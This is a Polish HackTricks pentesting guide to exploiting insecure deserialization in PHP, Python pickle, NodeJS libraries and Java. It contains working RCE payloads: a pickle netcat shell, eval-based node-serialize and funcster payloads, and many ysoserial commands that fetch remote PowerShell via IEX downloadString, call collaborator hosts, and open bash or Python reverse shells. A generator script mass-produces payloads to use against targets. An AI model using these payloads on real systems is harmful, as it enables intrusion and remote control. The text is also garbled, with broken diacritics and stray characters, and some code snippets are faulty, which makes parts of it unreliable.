# Deserializacja

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

**Serializacja** to metoda polegajca na konwertowaniu obiektu na format, kt贸ry mo偶na zachowa, z zamiarem przechowywania obiektu lub przesyania go w ramach procesu komunikacji. Ta technika jest powszechnie stosowana, aby zapewni, 偶e obiekt mo偶na odtworzy w p贸藕niejszym czasie, zachowujc jego struktur i stan.

**Deserializacja**, z kolei, to proces przeciwny do serializacji. Polega na pobraniu danych, kt贸re zostay sformatowane w okrelonym formacie i odtworzeniu ich z powrotem jako obiekt.

Deserializacja mo偶e by niebezpieczna, poniewa偶 potencjalnie **pozwala atakujcym manipulowa zserializowanymi danymi w celu wykonania szkodliwego kodu** lub wywoania nieoczekiwanego zachowania w aplikacji podczas procesu odtwarzania obiektu.

## PHP

W PHP podczas proces贸w serializacji i deserializacji wykorzystuje si konkretne magiczne metody:

* `__sleep`: Wywoywana podczas serializacji obiektu. Ta metoda powinna zwr贸ci tablic nazw wszystkich waciwoci obiektu, kt贸re powinny by zserializowane. Jest powszechnie u偶ywana do zatwierdzania oczekujcych danych lub wykonywania podobnych zada czyszczcych.
* `__wakeup`: Wywoywana podczas deserializacji obiektu. Su偶y do ponownego nawizania pocze z baz danych, kt贸re mogy zosta utracone podczas serializacji, oraz do wykonywania innych zada ponownej inicjalizacji.
* `__unserialize`: Ta metoda jest wywoywana zamiast `__wakeup` (jeli istnieje) podczas deserializacji obiektu. Daje ona wiksz kontrol nad procesem deserializacji w por贸wnaniu do `__wakeup`.
* `__destruct`: Ta metoda jest wywoywana, gdy obiekt ma zosta zniszczony lub gdy skrypt si koczy. Zazwyczaj jest u偶ywana do zada czyszczcych, takich jak zamykanie uchwyt贸w plik贸w lub pocze z baz danych.
* `__toString`: Ta metoda pozwala traktowa obiekt jako cig znak贸w. Mo偶e by u偶ywana do odczytywania pliku lub innych zada opartych na wywoaniach funkcji wewntrz niej, efektywnie dostarczajc tekstow reprezentacj obiektu.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Jeli spojrzysz na wyniki, zobaczysz, 偶e funkcje **`__wakeup`** i **`__destruct`** s wywoywane podczas deserializacji obiektu. Zauwa偶, 偶e w kilku samouczkach znajdziesz, 偶e funkcja **`__toString`** jest wywoywana podczas pr贸by wydrukowania pewnego atrybutu, ale najwyra藕niej to **ju偶 si nie dzieje**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** jest wywoywana **zamiast `__wakeup()`** jeli jest zaimplementowana w klasie. Pozwala ona na deserializacj obiektu, dostarczajc dane zserializowane jako tablic. Mo偶esz u偶y tej metody do deserializacji waciwoci i wykona wszelkie konieczne czynnoci podczas deserializacji.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Mo偶esz przeczyta wyjaniony **przykad PHP tutaj**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), tutaj [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) lub tutaj [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### Deserializacja PHP + Klasy Autoload

Mo偶esz nadu偶y funkcjonalnoci automatycznego adowania w PHP do wczytywania dowolnych plik贸w PHP i nie tylko:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializacja Wartoci z Referencjami

Jeli z jakiego powodu chcesz zserializowa warto jako **referencj do innej zserializowanej wartoci**, mo偶esz to zrobi:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial dla PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) mo偶e pom贸c w generowaniu adunk贸w w celu nadu偶ycia deserializacji w PHP.\
Zauwa偶, 偶e w wielu przypadkach **nie bdziesz w stanie znale藕 sposobu na nadu偶ycie deserializacji w kodzie 藕r贸dowym** aplikacji, ale mo偶esz **nadu偶y kod zewntrznych rozszerze PHP.**\
Dlatego, jeli mo偶esz, sprawd藕 `phpinfo()` serwera i **szukaj w internecie** (nawet w **gad偶etach** z **PHPGGC**) mo偶liwych gad偶et贸w, kt贸rych mo偶esz nadu偶y.

### Deserializacja metadanych phar://

Jeli znalaze LFI, kt贸ry tylko czyta plik i nie wykonuje w nim kodu PHP, na przykad za pomoc funkcji takich jak _**file\_get\_contents(), fopen(), file() lub file\_exists(), md5\_file(), filemtime() lub filesize()**_. Mo偶esz spr贸bowa nadu偶y **deserializacji**, kt贸ra wystpuje podczas **odczytywania** pliku za pomoc protokou **phar**.\
Aby uzyska wicej informacji, przeczytaj nastpujcy post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Gdy obiekt zostanie odblokowany, zostanie wykonana funkcja _\_\_reduce\_\__.\
W przypadku wykorzystania, serwer mo偶e zwr贸ci bd.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Dla dalszych informacji na temat ucieczki z **wizie pickle**, sprawd藕:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Nastpna strona prezentuje technik **wykorzystania niebezpiecznej deserializacji w bibliotekach pythona obsugujcych yamle** i koczy si narzdziem, kt贸re mo偶na u偶y do generowania adunk贸w deserializacji RCE dla **Pickle, PyYAML, jsonpickle i ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Zanieczyszczenie klasy (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Magiczne funkcje JS

JS **nie ma "magicznych" funkcji** jak PHP czy Python, kt贸re zostan wykonane tylko w celu utworzenia obiektu. Ale ma kilka **funkcji**, kt贸re s **czsto u偶ywane nawet bez bezporedniego ich wywoywania**, takich jak **`toString`**, **`valueOf`**, **`toJSON`**.\
Wykorzystujc deserializacj, mo偶esz **zak贸ci te funkcje, aby wykona inny kod** (potencjalnie wykorzystujc zanieczyszczenia prototyp贸w), co pozwoli ci wykona dowolny kod podczas ich wywoywania.

Innym **"magicznym" sposobem wywoania funkcji** bez bezporedniego jej wywoywania jest **zak贸cenie obiektu zwracanego przez funkcj asynchroniczn** (promise). Poniewa偶, jeli **przeksztacisz** ten **obiekt zwracany** w inny **promise** z **waciwoci** o nazwie **"then" typu funkcja**, zostanie **wykonany** tylko dlatego, 偶e jest zwracany przez inny promise. _Zajrzyj_ [_**pod ten link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _dla wicej informacji._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### Zanieczyszczenie `__proto__` i `prototype`

Jeli chcesz dowiedzie si wicej o tej technice, **zapoznaj si z nastpujcym samouczkiem**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ta biblioteka pozwala na serializacj funkcji. Przykad:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Obiekt **zserializowany** bdzie wyglda nastpujco:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
W przykadzie wida, 偶e gdy funkcja jest serializowana, do obiektu serializowanego dodawana jest flaga `_$$ND_FUNC$$_`.

W pliku `node-serialize/lib/serialize.js` mo偶na znale藕 t sam flag i spos贸b jej u偶ycia w kodzie.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Jak wida w ostatnim fragmencie kodu, **jeli flaga zostanie znaleziona**, u偶ywane jest `eval` do deserializacji funkcji, wic w zasadzie **wejcie u偶ytkownika jest u偶ywane wewntrz funkcji `eval`**.

Jednak偶e, **tylko serializacja** funkcji **nie spowoduje jej wykonania**, poniewa偶 konieczne byoby, aby jaki fragment kodu **wywoa `y.rce`** w naszym przykadzie, co jest mao **prawdopodobne**.\
W ka偶dym razie, mo偶na **zmodyfikowa serializowany obiekt** **dodajc nawiasy** w celu automatycznego wykonania zserializowanej funkcji podczas deserializacji obiektu.\
W nastpnym fragmencie kodu **zauwa偶 ostatni nawias** i spos贸b, w jaki funkcja `unserialize` automatycznie wykona kod:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Jak wczeniej wskazano, ta biblioteka pobierze kod po `_$$ND_FUNC$$_` i **wykona go** za pomoc `eval`. Dlatego, aby **automatycznie wykona kod**, mo偶na **usun cz tworzenia funkcji** oraz ostatni nawias i **po prostu wykona jednoliniowy kod JS** jak w poni偶szym przykadzie:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Mo偶esz [**znale藕 tutaj**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dalsze informacje** na temat sposobu wykorzystania tej podatnoci.

### [funcster](https://www.npmjs.com/package/funcster)

Wartociowym aspektem **funcstera** jest niedostpno **standardowych obiekt贸w wbudowanych**; wypadaj one poza dostpnym zakresem. To ograniczenie uniemo偶liwia wykonanie kodu pr贸bujcego wywoa metody na obiektach wbudowanych, co prowadzi do wyjtk贸w takich jak `"ReferenceError: console is not defined"`, gdy u偶ywane s polecenia typu `console.log()` lub `require(something)`.

Mimo tego ograniczenia, przywr贸cenie penego dostpu do globalnego kontekstu, w tym wszystkich standardowych obiekt贸w wbudowanych, jest mo偶liwe dziki okrelonej metodzie. Korzystajc bezporednio z globalnego kontekstu, mo偶na omin to ograniczenie. Na przykad dostp mo偶na przywr贸ci za pomoc nastpujcego fragmentu:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Aby uzyska** [**wicej informacji przeczytaj ten 藕r贸do**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Pakiet **serialize-javascript** jest przeznaczony wycznie do cel贸w serializacji, nie posiada wbudowanych funkcji deserializacji. U偶ytkownicy s odpowiedzialni za implementacj wasnej metody deserializacji. Bezporednie u偶ycie `eval` jest sugerowane przez oficjalny przykad deserializacji danych zserializowanych:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Jeli ta funkcja jest u偶ywana do deserializacji obiekt贸w, mo偶esz to atwo **wykorzysta**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Aby uzyska** [**wicej informacji przeczytaj ten 藕r贸do**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioteka Cryo

Na nastpnych stronach znajdziesz informacje na temat nadu偶ywania tej biblioteki do wykonywania dowolnych polece:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

W Javie **wywoania zwrotne deserializacji s wykonywane podczas procesu deserializacji**. To wykonanie mo偶e by wykorzystane przez atakujcych, kt贸rzy tworz zoliwe adunki, kt贸re wyzwalaj te wywoania zwrotne, prowadzc do potencjalnego wykonania szkodliwych dziaa.

### Odciski palc贸w

#### White Box

Aby zidentyfikowa potencjalne podatnoci na serializacj w kodzie, wyszukaj:

* Klasy implementujce interfejs `Serializable`.
* U偶ycie funkcji `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Zwr贸 szczeg贸ln uwag na:

* `XMLDecoder` u偶ywany z parametrami zdefiniowanymi przez u偶ytkownik贸w zewntrznych.
* Metoda `fromXML` z `XStream`, zwaszcza jeli wersja XStream jest mniejsza lub r贸wna 1.46, poniewa偶 jest podatna na problemy z serializacj.
* `ObjectInputStream` w poczeniu z metod `readObject`.
* Implementacja metod takich jak `readObject`, `readObjectNodData`, `readResolve` lub `readExternal`.
* `ObjectInputStream.readUnshared`.
* Og贸lne u偶ycie `Serializable`.

#### Black Box

Podczas test贸w black box, szukaj konkretnych **sygnatur lub "Magicznych bajt贸w"**, kt贸re oznaczaj obiekty zserializowane w Javie (pochodzce z `ObjectInputStream`):

* Wzorzec szesnastkowy: `AC ED 00 05`.
* Wzorzec Base64: `rO0`.
* Nag贸wki odpowiedzi HTTP z ustawionym `Content-type` na `application/x-java-serialized-object`.
* Wzorzec szesnastkowy wskazujcy na wczeniejsz kompresj: `1F 8B 08 00`.
* Wzorzec Base64 wskazujcy na wczeniejsz kompresj: `H4sIA`.
* Pliki internetowe z rozszerzeniem `.faces` i parametrem `faces.ViewState`. Odkrycie tych wzorc贸w w aplikacji internetowej powinno skoni do dokadnego zbadania, jak opisano w [pocie dotyczcym Deserializacji Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Sprawd藕, czy jest podatny

Jeli chcesz dowiedzie si, **jak dziaa eksploit deserializacji w Javie**, powiniene zajrze do [**Podstawowa deserializacja w Javie**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializacja DNS w Javie**](java-dns-deserialization-and-gadgetprobe.md) oraz [**adunek CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Test White Box

Mo偶esz sprawdzi, czy zainstalowana jest jaka aplikacja znanymi podatnociami.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Mo偶esz spr贸bowa **sprawdzi wszystkie biblioteki** uznane za podatne, na kt贸re [**Ysoserial**](https://github.com/frohoff/ysoserial) mo偶e dostarczy exploit. Mo偶esz tak偶e sprawdzi biblioteki wskazane na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Mo偶esz r贸wnie偶 u偶y [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector), aby wyszuka mo偶liwe acuchy gad偶et贸w, kt贸re mo偶na wykorzysta.\
Podczas uruchamiania **gadgetinspector** (po jego zbudowaniu) nie przejmuj si iloci ostrze偶e/bd贸w, przez kt贸re przechodzi, pozw贸l mu zakoczy. Wszystkie znalezione informacje zostan zapisane w _gadgetinspector/gadget-results/gadget-chains-rok-miesic-dzie-godzina-minuta.txt_. Zauwa偶, 偶e **gadgetinspector nie tworzy exploitu i mo偶e wskazywa faszywe pozytywy**.

#### Test Czarnej Skrzynki

Korzystajc z rozszerzenia Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), mo偶esz zidentyfikowa **jakie biblioteki s dostpne** (nawet wersje). Dziki tym informacjom mo偶e by **atwiej wybra payload** do wykorzystania podatnoci.\
[**Przeczytaj to, aby dowiedzie si wicej o GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe skupia si na deserializacjach **`ObjectInputStream`**.

Korzystajc z rozszerzenia Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), mo偶esz **zidentyfikowa podatne biblioteki** podatne na exploitowanie za pomoc ysoserial i je **wykorzysta**.\
[**Przeczytaj to, aby dowiedzie si wicej o Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner skupia si na deserializacjach **`ObjectInputStream`**.

Mo偶esz tak偶e u偶y [**Freddy**](https://github.com/nccgroup/freddy), aby wykry podatnoci na deserializacje w **Burp**. To wtyczka wykryje podatnoci **nie tylko zwizane z `ObjectInputStream`**, ale tak偶e podatnoci z bibliotek deserializacji **Json** i **Yml**. W trybie aktywnym spr贸buje je potwierdzi, u偶ywajc payload贸w sleep lub DNS.\
[**Wicej informacji o Freddy znajdziesz tutaj.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Test Serializacji**

Nie chodzi tylko o sprawdzenie, czy serwer u偶ywa podatnej biblioteki. Czasami mo偶esz **zmieni dane wewntrz zserializowanego obiektu i omin niekt贸re kontrole** (mo偶e to da ci uprawnienia administratora w aplikacji internetowej).\
Jeli znajdziesz zserializowany obiekt Javy wysyany do aplikacji internetowej, mo偶esz u偶y [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper), aby wydrukowa w bardziej czytelnej formie obiekt zserializowany, kt贸ry jest wysyany. Znajc dane, kt贸re wysyasz, atwiej bdzie je zmodyfikowa i omin niekt贸re kontrole.

### **Exploit**

#### **ysoserial**

G贸wnym narzdziem do eksploitacji deserializacji Javy jest [**ysoserial**](https://github.com/frohoff/ysoserial) ([**pobierz tutaj**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Mo偶esz tak偶e rozwa偶y u偶ycie [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), co pozwoli ci u偶ywa zo偶onych polece (z rurami na przykad).\
Zauwa偶, 偶e to narzdzie jest **skoncentrowane** na eksploatacji **`ObjectInputStream`**.\
Zalecam **rozpoczcie od u偶ywania adunku "URLDNS"** przed adunkiem RCE, aby przetestowa, czy wstrzyknicie jest mo偶liwe. Zauwa偶 jednak, 偶e mo偶e si zdarzy, 偶e adunek "URLDNS" nie dziaa, ale inny adunek RCE tak.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Podczas tworzenia adunku dla **java.lang.Runtime.exec()** nie mo偶esz u偶ywa znak贸w specjalnych takich jak ">" lub "|" do przekierowywania wyniku wykonania, "$()" do wykonywania polece ani nawet **przekazywa argument贸w** do polecenia oddzielonych **spacjami** (mo偶esz u偶y `echo -n "hello world"`, ale nie mo偶esz u偶y `python2 -c 'print "Hello world"'`). Aby poprawnie zakodowa adunek, mo偶esz skorzysta z [tej strony internetowej](http://www.jackson-t.ca/runtime-exec-payloads.html).

Mo偶esz swobodnie u偶y poni偶szego skryptu do stworzenia **wszystkich mo偶liwych adunk贸w wykonania kodu** dla system贸w Windows i Linux, a nastpnie przetestowa je na podatnej stronie internetowej:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Mo偶esz **u偶y** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **razem z ysoserial, aby tworzy wicej exploit贸w**. Wicej informacji o tym narzdziu znajdziesz w **slajdach prezentacji**, gdzie narzdzie zostao przedstawione: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)mo偶e by u偶ywany do generowania adunk贸w w celu wykorzystania r贸偶nych bibliotek serializacji **Json** i **Yml** w Javie.\
Aby skompilowa projekt, musiaem **doda** te **zale偶noci** do `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Zainstaluj maven**, a nastpnie **skompiluj** projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Dowiedz si wicej o tej bibliotece Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratoria

* Jeli chcesz przetestowa niekt贸re adunki ysoserial, mo偶esz **uruchomi t aplikacj internetow**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
